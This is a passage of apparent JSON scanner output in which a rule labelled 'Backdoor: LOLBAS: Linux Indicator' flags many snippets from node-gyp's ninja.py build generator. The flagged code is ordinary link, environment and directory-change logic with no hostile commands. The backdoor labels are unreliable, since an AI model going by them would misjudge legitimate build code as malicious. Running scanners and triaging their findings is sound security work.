                    "text": "            \"if [ ! -e $lib -o ! -e $lib.TOC ]; then \"\n            \"%(solink)s && %(extract_toc)s > $lib.TOC; else \"\n            \"%(solink)s && %(extract_toc)s > $lib.tmp && \"\n            \"if ! cmp -s $lib.tmp $lib.TOC; then mv $lib.tmp $lib.TOC ; \"\n            \"fi; fi\"\n            % {\n                \"solink\": \"$ld -shared $ldflags -o $lib -Wl,-soname=$soname %(suffix)s\",\n",
                    "rendered": {
                      "text": "            \"if [ ! -e $lib -o ! -e $lib.TOC ]; then \"\n            \"%(solink)s && %(extract_toc)s > $lib.TOC; else \"\n            \"%(solink)s && %(extract_toc)s > $lib.tmp && \"\n            \"if ! cmp -s $lib.tmp $lib.TOC; then mv $lib.tmp $lib.TOC ; \"\n            \"fi; fi\"\n            % {\n                \"solink\": \"$ld -shared $ldflags -o $lib -Wl,-soname=$soname %(suffix)s\",\n",
                      "markdown": "`            \"if [ ! -e $lib -o ! -e $lib.TOC ]; then \"\n            \"%(solink)s && %(extract_toc)s > $lib.TOC; else \"\n            \"%(solink)s && %(extract_toc)s > $lib.tmp && \"\n            \"if ! cmp -s $lib.tmp $lib.TOC; then mv $lib.tmp $lib.TOC ; \"\n            \"fi; fi\"\n            % {\n                \"solink\": \"$ld -shared $ldflags -o $lib -Wl,-soname=$soname %(suffix)s\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2297,
                  "startColumn": 11,
                  "endLine": 2297,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        if key == \"NM.host\":\n            nm_host = os.path.join(build_to_root, value)\n        if key == \"READELF\":\n            readelf = os.path.join(build_to_root, value)\n        if key == \"READELF.host\":\n            readelf_host = os.path.join(build_to_root, value)\n        if key.endswith(\"_wrapper\"):\n",
                    "rendered": {
                      "text": "        if key == \"NM.host\":\n            nm_host = os.path.join(build_to_root, value)\n        if key == \"READELF\":\n            readelf = os.path.join(build_to_root, value)\n        if key == \"READELF.host\":\n            readelf_host = os.path.join(build_to_root, value)\n        if key.endswith(\"_wrapper\"):\n",
                      "markdown": "`        if key == \"NM.host\":\n            nm_host = os.path.join(build_to_root, value)\n        if key == \"READELF\":\n            readelf = os.path.join(build_to_root, value)\n        if key == \"READELF.host\":\n            readelf_host = os.path.join(build_to_root, value)\n        if key.endswith(\"_wrapper\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2260,
                  "startColumn": 3,
                  "endLine": 2260,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    clang_cl = None\n    nm = \"nm\"\n    nm_host = \"nm\"\n    readelf = \"readelf\"\n    readelf_host = \"readelf\"\n\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n",
                    "rendered": {
                      "text": "    clang_cl = None\n    nm = \"nm\"\n    nm_host = \"nm\"\n    readelf = \"readelf\"\n    readelf_host = \"readelf\"\n\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n",
                      "markdown": "`    clang_cl = None\n    nm = \"nm\"\n    nm_host = \"nm\"\n    readelf = \"readelf\"\n    readelf_host = \"readelf\"\n\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1963,
                  "startColumn": 54,
                  "endLine": 1963,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        else:\n            env = self.ComputeExportEnvString(env)\n            command = gyp.common.EncodePOSIXShellList(args)\n            command = \"cd %s; \" % self.build_to_base + env + command\n\n        # GYP rules/actions express being no-ops by not touching their outputs.\n        # Avoid executing downstream dependencies in this case by specifying\n",
                    "rendered": {
                      "text": "        else:\n            env = self.ComputeExportEnvString(env)\n            command = gyp.common.EncodePOSIXShellList(args)\n            command = \"cd %s; \" % self.build_to_base + env + command\n\n        # GYP rules/actions express being no-ops by not touching their outputs.\n        # Avoid executing downstream dependencies in this case by specifying\n",
                      "markdown": "`        else:\n            env = self.ComputeExportEnvString(env)\n            command = gyp.common.EncodePOSIXShellList(args)\n            command = \"cd %s; \" % self.build_to_base + env + command\n\n        # GYP rules/actions express being no-ops by not touching their outputs.\n        # Avoid executing downstream dependencies in this case by specifying\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1961,
                  "startColumn": 11,
                  "endLine": 1961,
                  "endColumn": 16,
                  "snippet": {
                    "text": "                + run_in\n            )\n        else:\n            env = self.ComputeExportEnvString(env)\n            command = gyp.common.EncodePOSIXShellList(args)\n            command = \"cd %s; \" % self.build_to_base + env + command\n\n",
                    "rendered": {
                      "text": "                + run_in\n            )\n        else:\n            env = self.ComputeExportEnvString(env)\n            command = gyp.common.EncodePOSIXShellList(args)\n            command = \"cd %s; \" % self.build_to_base + env + command\n\n",
                      "markdown": "`                + run_in\n            )\n        else:\n            env = self.ComputeExportEnvString(env)\n            command = gyp.common.EncodePOSIXShellList(args)\n            command = \"cd %s; \" % self.build_to_base + env + command\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1946,
                  "startColumn": 53,
                  "endLine": 1946,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        args = [self.ExpandSpecial(arg, self.base_to_build) for arg in args]\n        if self.flavor == \"win\":\n            rspfile = rule_name + \".$unique_name.rsp\"\n            # The cygwin case handles this inside the bash sub-shell.\n            run_in = \"\" if win_shell_flags.cygwin else \" \" + self.build_to_base\n            if win_shell_flags.cygwin:\n                rspfile_content = self.msvs_settings.BuildCygwinBashCommandLine(\n",
                    "rendered": {
                      "text": "        args = [self.ExpandSpecial(arg, self.base_to_build) for arg in args]\n        if self.flavor == \"win\":\n            rspfile = rule_name + \".$unique_name.rsp\"\n            # The cygwin case handles this inside the bash sub-shell.\n            run_in = \"\" if win_shell_flags.cygwin else \" \" + self.build_to_base\n            if win_shell_flags.cygwin:\n                rspfile_content = self.msvs_settings.BuildCygwinBashCommandLine(\n",
                      "markdown": "`        args = [self.ExpandSpecial(arg, self.base_to_build) for arg in args]\n        if self.flavor == \"win\":\n            rspfile = rule_name + \".$unique_name.rsp\"\n            # The cygwin case handles this inside the bash sub-shell.\n            run_in = \"\" if win_shell_flags.cygwin else \" \" + self.build_to_base\n            if win_shell_flags.cygwin:\n                rspfile_content = self.msvs_settings.BuildCygwinBashCommandLine(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1756,
                  "startColumn": 11,
                  "endLine": 1757,
                  "snippet": {
                    "text": "        # G will be non-null if any postbuild fails. Run all postbuilds in a\n        # subshell.\n        commands = (\n            env\n            + \" (\"\n            + \" && \".join([ninja_syntax.escape(command) for command in postbuilds])\n        )\n        command_string = (\n",
                    "rendered": {
                      "text": "        # G will be non-null if any postbuild fails. Run all postbuilds in a\n        # subshell.\n        commands = (\n            env\n            + \" (\"\n            + \" && \".join([ninja_syntax.escape(command) for command in postbuilds])\n        )\n        command_string = (\n",
                      "markdown": "`        # G will be non-null if any postbuild fails. Run all postbuilds in a\n        # subshell.\n        commands = (\n            env\n            + \" (\"\n            + \" && \".join([ninja_syntax.escape(command) for command in postbuilds])\n        )\n        command_string = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1752,
                  "startColumn": 7,
                  "endLine": 1752,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        postbuilds.insert(\n            0, gyp.common.EncodePOSIXShellList([\"cd\", self.build_to_base])\n        )\n        env = self.ComputeExportEnvString(self.GetSortedXcodePostbuildEnv())\n        # G will be non-null if any postbuild fails. Run all postbuilds in a\n        # subshell.\n        commands = (\n",
                    "rendered": {
                      "text": "        postbuilds.insert(\n            0, gyp.common.EncodePOSIXShellList([\"cd\", self.build_to_base])\n        )\n        env = self.ComputeExportEnvString(self.GetSortedXcodePostbuildEnv())\n        # G will be non-null if any postbuild fails. Run all postbuilds in a\n        # subshell.\n        commands = (\n",
                      "markdown": "`        postbuilds.insert(\n            0, gyp.common.EncodePOSIXShellList([\"cd\", self.build_to_base])\n        )\n        env = self.ComputeExportEnvString(self.GetSortedXcodePostbuildEnv())\n        # G will be non-null if any postbuild fails. Run all postbuilds in a\n        # subshell.\n        commands = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1747,
                  "startColumn": 20,
                  "endLine": 1747,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n        if not postbuilds:\n            return \"\"\n        # Postbuilds expect to be run in the gyp file's directory, so insert an\n        # implicit postbuild to cd to there.\n        postbuilds.insert(\n            0, gyp.common.EncodePOSIXShellList([\"cd\", self.build_to_base])\n",
                    "rendered": {
                      "text": "\n        if not postbuilds:\n            return \"\"\n        # Postbuilds expect to be run in the gyp file's directory, so insert an\n        # implicit postbuild to cd to there.\n        postbuilds.insert(\n            0, gyp.common.EncodePOSIXShellList([\"cd\", self.build_to_base])\n",
                      "markdown": "`\n        if not postbuilds:\n            return \"\"\n        # Postbuilds expect to be run in the gyp file's directory, so insert an\n        # implicit postbuild to cd to there.\n        postbuilds.insert(\n            0, gyp.common.EncodePOSIXShellList([\"cd\", self.build_to_base])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1709,
                  "startColumn": 35,
                  "endLine": 1709,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        \"\"\"Returns the variables Xcode would set for postbuild steps.\"\"\"\n        postbuild_settings = {}\n        # CHROMIUM_STRIP_SAVE_FILE is a chromium-specific hack.\n        # TODO(thakis): It would be nice to have some general mechanism instead.\n        strip_save_file = self.xcode_settings.GetPerTargetSetting(\n            \"CHROMIUM_STRIP_SAVE_FILE\"\n        )\n",
                    "rendered": {
                      "text": "        \"\"\"Returns the variables Xcode would set for postbuild steps.\"\"\"\n        postbuild_settings = {}\n        # CHROMIUM_STRIP_SAVE_FILE is a chromium-specific hack.\n        # TODO(thakis): It would be nice to have some general mechanism instead.\n        strip_save_file = self.xcode_settings.GetPerTargetSetting(\n            \"CHROMIUM_STRIP_SAVE_FILE\"\n        )\n",
                      "markdown": "`        \"\"\"Returns the variables Xcode would set for postbuild steps.\"\"\"\n        postbuild_settings = {}\n        # CHROMIUM_STRIP_SAVE_FILE is a chromium-specific hack.\n        # TODO(thakis): It would be nice to have some general mechanism instead.\n        strip_save_file = self.xcode_settings.GetPerTargetSetting(\n            \"CHROMIUM_STRIP_SAVE_FILE\"\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1685,
                  "startColumn": 14,
                  "endLine": 1686,
                  "snippet": {
                    "text": "        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n\n    def GetMsvsToolchainEnv(self, additional_settings=None):\n        \"\"\"Returns the variables Visual Studio would set for build steps.\"\"\"\n        return self.msvs_settings.GetVSMacroEnv(\n",
                    "rendered": {
                      "text": "        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n\n    def GetMsvsToolchainEnv(self, additional_settings=None):\n        \"\"\"Returns the variables Visual Studio would set for build steps.\"\"\"\n        return self.msvs_settings.GetVSMacroEnv(\n",
                      "markdown": "`        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n\n    def GetMsvsToolchainEnv(self, additional_settings=None):\n        \"\"\"Returns the variables Visual Studio would set for build steps.\"\"\"\n        return self.msvs_settings.GetVSMacroEnv(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1684,
                  "startColumn": 11,
                  "endLine": 1684,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n\n    def GetMsvsToolchainEnv(self, additional_settings=None):\n",
                    "rendered": {
                      "text": "        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n\n    def GetMsvsToolchainEnv(self, additional_settings=None):\n",
                      "markdown": "`        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n\n    def GetMsvsToolchainEnv(self, additional_settings=None):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1682,
                  "startColumn": 7,
                  "endLine": 1682,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n    def GetToolchainEnv(self, additional_settings=None):\n        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n",
                    "rendered": {
                      "text": "\n    def GetToolchainEnv(self, additional_settings=None):\n        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n",
                      "markdown": "`\n    def GetToolchainEnv(self, additional_settings=None):\n        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1522,
                  "startColumn": 34,
                  "endLine": 1522,
                  "endColumn": 40,
                  "snippet": {
                    "text": "                # If an rspfile contains spaces, ninja surrounds the filename with\n                # quotes around it and then passes it to open(), creating a file with\n                # quotes in its name (and when looking for the rsp file, the name\n                # makes it through bash which strips the quotes) :-/\n                link_file_list = link_file_list.replace(\" \", \"_\")\n                extra_bindings.append(\n                    (\n",
                    "rendered": {
                      "text": "                # If an rspfile contains spaces, ninja surrounds the filename with\n                # quotes around it and then passes it to open(), creating a file with\n                # quotes in its name (and when looking for the rsp file, the name\n                # makes it through bash which strips the quotes) :-/\n                link_file_list = link_file_list.replace(\" \", \"_\")\n                extra_bindings.append(\n                    (\n",
                      "markdown": "`                # If an rspfile contains spaces, ninja surrounds the filename with\n                # quotes around it and then passes it to open(), creating a file with\n                # quotes in its name (and when looking for the rsp file, the name\n                # makes it through bash which strips the quotes) :-/\n                link_file_list = link_file_list.replace(\" \", \"_\")\n                extra_bindings.append(\n                    (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1151,
                  "startColumn": 7,
                  "endLine": 1151,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n        include_dirs = config.get(\"include_dirs\", [])\n\n        env = self.GetToolchainEnv()\n        if self.flavor == \"win\":\n            include_dirs = self.msvs_settings.AdjustIncludeDirs(\n                include_dirs, config_name\n",
                    "rendered": {
                      "text": "\n        include_dirs = config.get(\"include_dirs\", [])\n\n        env = self.GetToolchainEnv()\n        if self.flavor == \"win\":\n            include_dirs = self.msvs_settings.AdjustIncludeDirs(\n                include_dirs, config_name\n",
                      "markdown": "`\n        include_dirs = config.get(\"include_dirs\", [])\n\n        env = self.GetToolchainEnv()\n        if self.flavor == \"win\":\n            include_dirs = self.msvs_settings.AdjustIncludeDirs(\n                include_dirs, config_name\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 994,
                  "startColumn": 7,
                  "endLine": 994,
                  "endColumn": 12,
                  "snippet": {
                    "text": "            )\n\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        if partial_info_plist:\n            intermediate_plist = self.GypPathToUniqueOutput(\"merged_info.plist\")\n",
                    "rendered": {
                      "text": "            )\n\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        if partial_info_plist:\n            intermediate_plist = self.GypPathToUniqueOutput(\"merged_info.plist\")\n",
                      "markdown": "`            )\n\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        if partial_info_plist:\n            intermediate_plist = self.GypPathToUniqueOutput(\"merged_info.plist\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 993,
                  "startColumn": 7,
                  "endLine": 993,
                  "endColumn": 12,
                  "snippet": {
                    "text": "                variables=[(\"defines\", defines)],\n            )\n\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        if partial_info_plist:\n",
                    "rendered": {
                      "text": "                variables=[(\"defines\", defines)],\n            )\n\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        if partial_info_plist:\n",
                      "markdown": "`                variables=[(\"defines\", defines)],\n            )\n\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        if partial_info_plist:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 958,
                  "startColumn": 7,
                  "endLine": 958,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        bundle_depends.extend(\n            self.ninja.build(\n",
                    "rendered": {
                      "text": "        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        bundle_depends.extend(\n            self.ninja.build(\n",
                      "markdown": "`        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        bundle_depends.extend(\n            self.ninja.build(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 957,
                  "startColumn": 7,
                  "endLine": 957,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        bundle_depends.extend(\n",
                    "rendered": {
                      "text": "\n        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        bundle_depends.extend(\n",
                      "markdown": "`\n        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        bundle_depends.extend(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 894,
                  "startColumn": 7,
                  "endLine": 894,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n\n        for output, res in gyp.xcode_emulation.GetMacBundleResources(\n",
                    "rendered": {
                      "text": "\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n\n        for output, res in gyp.xcode_emulation.GetMacBundleResources(\n",
                      "markdown": "`\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n\n        for output, res in gyp.xcode_emulation.GetMacBundleResources(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 893,
                  "startColumn": 7,
                  "endLine": 893,
                  "endColumn": 12,
                  "snippet": {
